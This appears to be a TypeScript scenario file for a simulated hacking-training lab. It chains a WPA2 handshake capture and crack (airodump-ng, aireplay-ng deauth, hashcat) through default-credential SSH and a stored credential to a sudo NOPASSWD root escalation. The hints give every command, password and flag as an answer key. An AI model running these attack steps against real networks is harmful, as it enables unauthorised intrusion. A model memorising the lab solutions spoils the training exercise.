import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Wireless module capstone: one continuous five-flag chain from a live WPA2 handshake capture all the
 *  way to a wired-network file server compromise — proving a cracked WiFi passphrase is rarely the end
 *  goal, just the first foothold onto whatever that wireless VLAN can reach. Every mechanic (airmon-ng/
 *  airodump-ng/aireplay-ng/hashcat -m 22000, ssh, sudo NOPASSWD) is already established elsewhere on this
 *  platform; the point of a capstone is chaining the wireless foothold into a full wired-network pivot. */
export const wirelessCapstoneLabs: LabScenario[] = [
  {
    id: 'wireless-capstone-wpa2-crack-to-wired-network-pivot',
    title: 'Capstone: WPA2 Handshake Crack to Full Wired-Network Pivot',
    difficulty: 'Hard',
    category: 'Wireless',
    briefing:
      "Northfield Logistics's warehouse WiFi is WPA2-Personal with a weak, guessable passphrase. Cracking " +
      "it is only the first foothold: that wireless VLAN reaches an internal print/label-bridge device " +
      "still running default credentials, and that device holds a stored credential for the wired file server " +
      "segment it was never supposed to have direct access to at all. Follow the full chain from captured " +
      "handshake to wired-network file server compromise.",
    objectives: [
      { text: 'airmon-ng start wlan0, then airodump-ng wlan0mon to locate the target BSSID', why: 'Standard monitor-mode + scan workflow — confirms the target network, channel, and encryption type before committing to a capture.' },
      { text: 'airodump-ng --bssid 04:2B:8C:6D:9F:52 -c 11 -w capture wlan0mon, then aireplay-ng --deauth 5 -a 04:2B:8C:6D:9F:52 wlan0mon, then re-run the targeted capture', why: 'Forces a connected client to reassociate, generating a fresh 4-way handshake to capture — WPA2\'s deauth frames are unauthenticated and trivially spoofable, which is exactly why this works.' },
      { text: 'hashcat -m 22000 capture-01.hc22000 /root/wordlists/warehouse-wordlist.txt and capture the first flag', why: 'Mode 22000 is the modern unified hashcat mode for WPA EAPOL/PMKID captures — entirely offline, and the passphrase here is a common dictionary word.' },
      { text: 'ssh admin@10.10.280.10 using the still-default credential on the print/label bridge, then cat user.txt for the second flag', why: 'A device reachable once you\'re on the wireless VLAN, still running its factory-default credential — one of the single most common real IoT/embedded-device findings.' },
      { text: 'Read stored-cred-note.txt, then ssh svc-fileshare@10.10.280.20 with the credential it reveals and capture the third flag', why: 'The print bridge was never meant to hold a wired-segment credential at all — but convenience configuration routinely bridges trust boundaries that were supposed to stay separate.' },
      { text: 'Run sudo -l, escalate through the NOPASSWD rule it reveals, and capture the fourth flag', why: 'A local privesc mechanism completely unrelated to wireless at all — the actual value of the chain is reaching this box in the first place.' },
      { text: 'Read warehouse-inventory-export.csv and capture the final flag', why: 'The concrete impact statement the whole chain was building toward, starting from nothing but a crackable WiFi passphrase.' },
    ],
    hints: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'airodump-ng --bssid 04:2B:8C:6D:9F:52 -c 11 -w capture wlan0mon',
      'aireplay-ng --deauth 5 -a 04:2B:8C:6D:9F:52 wlan0mon',
      'airodump-ng --bssid 04:2B:8C:6D:9F:52 -c 11 -w capture wlan0mon',
      'hashcat -m 22000 capture-01.hc22000 /root/wordlists/warehouse-wordlist.txt',
      'ssh admin@10.10.280.10',
      'admin123',
      'cat user.txt',
      'cat stored-cred-note.txt',
      'exit',
      'ssh svc-fileshare@10.10.280.20',
      'Wareh0use_Files_24!',
      'cat user.txt',
      'sudo -l',
      'sudo /usr/local/bin/inventory-sync --shell',
      'cat /root/root.txt',
      'cat /root/warehouse-inventory-export.csv',
    ],
    totalFlags: 5,
    attacker: attacker({
      wordlists: dir({ 'warehouse-wordlist.txt': file('123456\npassword\nwarehouse1\nforklift99\nletmein\n') }),
    }),
    network: [
      {
        hostname: 'branch-ap-02',
        ip: '10.10.280.1',
        os: 'n/a (802.11 access point)',
        services: [],
        users: [],
        root: dir({}),
        wifiNetwork: {
          ssid: 'Northfield-Warehouse-WiFi',
          bssid: '04:2B:8C:6D:9F:52',
          channel: 11,
          encryption: 'WPA2',
          captureFile:
            '#HASHCAT_HASH:22000*02*a1c3f0e29d1b8c6d3e1f9a7b5c40bf3a*042b8c6d9f52*b4c3f0e29d1a*4e6f727468\n' +
              '#HASHCAT_PLAINTEXT:warehouse1\n' +
              '#HASHCAT_FLAG:flag{wireless_wpa2_live_capture_deauth_forced_handshake_crack}\n',
        },
      } as HostDef,
      {
        hostname: 'print-bridge01',
        ip: '10.10.280.10',
        os: 'Embedded Linux (label-printer / warehouse bridge device)',
        services: [{ port: 22, name: 'ssh', version: 'Dropbear sshd 2019.78' }],
        users: [{ username: 'admin', password: 'admin123' }],
        root: dir({
          home: dir({
            admin: dir({
              'user.txt': file(
                'Foothold confirmed on print-bridge01 via its factory-default credential, reachable once on the warehouse WiFi VLAN.\n' +
                  'flag{wpa2_crack_reaches_default_credential_iot_bridge_device}\n',
              ),
              'stored-cred-note.txt': file(
                [
                  '--- config note left by whoever set up label-printing to pull inventory data directly ---',
                  'wired file share account: svc-fileshare / Wareh0use_Files_24!',
                  'host: 10.10.280.20 (never meant to be reachable from this device at all)',
                  '',
                ].join('\n'),
              ),
            }),
          }),
        }),
      } as HostDef,
      {
        hostname: 'wired-files01',
        ip: '10.10.280.20',
        os: 'Ubuntu 22.04 LTS (wired-segment file server)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH 8.9p1' }],
        users: [
          {
            username: 'svc-fileshare',
            password: 'Wareh0use_Files_24!',
            sudo: { nopasswdCommands: ['/usr/local/bin/inventory-sync'] },
          },
        ],
        root: dir({
          home: dir({
            'svc-fileshare': dir({
              'user.txt': file(
                'Wireless-to-wired pivot confirmed on wired-files01 using the credential stored on the print bridge.\n' +
                  'flag{wireless_vlan_bridges_trust_boundary_into_wired_segment}\n',
              ),
            }),
          }),
          root: dir({
            'root.txt': file(
              "Root shell spawned via sudo /usr/local/bin/inventory-sync --shell (NOPASSWD).\n" +
                'flag{inventory_sync_nopasswd_sudo_root_privesc}\n',
            ),
            'warehouse-inventory-export.csv': file(
              [
                '# synthetic data — full warehouse inventory + shipment manifest export',
                'sku,description,quantity,unit_value_usd',
                '88213,Pallet Racking Unit,412,890.00',
                '88214,Forklift Battery Pack,88,1420.00',
                '--- full inventory system exposed, reached entirely from a cracked WiFi passphrase ---',
                'flag{full_chain_wpa2_crack_to_wired_inventory_system_exposure}',
                '',
              ].join('\n'),
            ),
          }),
        }),
      } as HostDef,
    ],
  },
];
